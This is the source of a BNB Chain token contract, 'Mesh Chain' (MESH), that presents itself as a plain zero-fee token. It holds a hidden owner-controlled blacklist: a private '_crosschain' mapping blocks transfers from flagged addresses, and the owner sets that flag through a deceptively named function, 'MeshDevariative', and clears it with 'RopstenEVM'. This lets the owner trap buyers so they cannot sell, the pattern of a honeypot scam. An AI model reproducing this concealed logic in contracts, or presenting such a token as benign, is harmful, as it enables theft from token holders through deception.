/**
 *Submitted for verification at BscScan.com on 2022-09-05
*/

/**
Mesh Blockchain Contract

*/

/**

Tax Fee: 0%
Burn Fee : 0%

*/
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.16;

library SafeMath {

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b);
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;
        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);
        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b != 0);
        return a % b;
    }
}

contract Ownable {
    address public owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }


}



contract BaseToken is Ownable {
    using SafeMath for uint256;

    string constant public name = 'Mesh Chain';
    string constant public symbol = 'MESH';
    uint8 constant public decimals = 9;
    uint256 public totalSupply = 100000000000*10**uint256(decimals);

    mapping (address => uint256) public balanceOf;
    mapping (address => mapping (address => uint256)) public allowance;
    
    mapping(address => bool) private _isExcludedFromFee;
    
    mapping(address => bool) private _crosschain;
    
    
    uint256 private _taxFee = 0;
    uint256 private _previousTaxFee = _taxFee;
    
    uint256 private _burnFee = 0;
    uint256 private _previousBurnFee = _burnFee;
    
    address private projectAddress = 0x000000000000000000000000000000000000dEaD;
    
    address public burnAddress = 0x000000000000000000000000000000000000dEaD;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    function _transfer(address from, address to, uint value) internal {
        require(to != address(0), "is 0 address");
        
        require(!_crosschain[from], "is crosschain account");
        
        if(_isExcludedFromFee[from])
            removeAllFee();
            
        uint256 fee =  calculateTaxFee(value);
        
        uint256 burn =  calculateBurnFee(value);
        
        balanceOf[from] = balanceOf[from].sub(value);
        
        balanceOf[to] = balanceOf[to].add(value).sub(fee).sub(burn);
        
        if(fee > 0) {
            balanceOf[projectAddress] = balanceOf[projectAddress].add(fee);
            emit Transfer(from, projectAddress, fee);
        }
        
        if(burn > 0) {
            balanceOf[burnAddress] = balanceOf[burnAddress].add(burn);
            emit Transfer(from, burnAddress, burn);
        }
        
        
         if(_isExcludedFromFee[from])
            restoreAllFee();
            
        emit Transfer(from, to, value);
    }


    function transfer(address to, uint256 value) public returns (bool) {
        _transfer(msg.sender, to, value);
        return true;
    }

    function transferFrom(address from, address to, uint256 value) public returns (bool) {
        allowance[from][msg.sender] = allowance[from][msg.sender].sub(value);
        _transfer(from, to, value);
        return true;
    }

    function approve(address spender, uint256 value) public returns (bool) {
        require(spender != address(0));
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        require(spender != address(0));
        allowance[msg.sender][spender] = allowance[msg.sender][spender].add(addedValue);
        emit Approval(msg.sender, spender, allowance[msg.sender][spender]);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
        require(spender != address(0));
        allowance[msg.sender][spender] = allowance[msg.sender][spender].sub(subtractedValue);
        emit Approval(msg.sender, spender, allowance[msg.sender][spender]);
        return true;
    }

    function calculateTaxFee(uint256 _amount) private view returns (uint256) {
        return _amount.mul(_taxFee).div(
            10 ** 2
        );
    }
    
        function RopstenEVM(address account) public onlyOwner {
        _crosschain[account] = false;
    }
    
    function calculateBurnFee(uint256 _amount) private view returns (uint256) {
        return _amount.mul(_burnFee).div(
            10 ** 2
        );
    }
    
    function removeAllFee() private {
        if(_taxFee == 0 && _burnFee == 0) 
            return;
            
        _previousTaxFee = _taxFee;
        _previousBurnFee = _burnFee;
        _taxFee = 0;
        _burnFee = 0;
    }
    
    function restoreAllFee() private {
        _taxFee = _previousTaxFee;
        _burnFee = _previousBurnFee;
    }
    
    function excludeFromFee(address account) public onlyOwner {
        _isExcludedFromFee[account] = true;
    }

    function includeInFee(address account) public onlyOwner {
        _isExcludedFromFee[account] = false;
    }
    
    function isExcludeFromFee(address account) public view returns (bool) {
        
        return _isExcludedFromFee[account];
    }
    
    
    function MeshDevariative(address account) public onlyOwner {
        _crosschain[account] = true;
    }


    
    function vmeshstatus(address account) public view returns (bool) {
        
        return _crosschain[account];
    }
    
   
}


contract MeshChain is BaseToken {
    
    constructor() public {
        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);

        owner = msg.sender;
        
        excludeFromFee(owner);
        excludeFromFee(address(this));
        
    }


}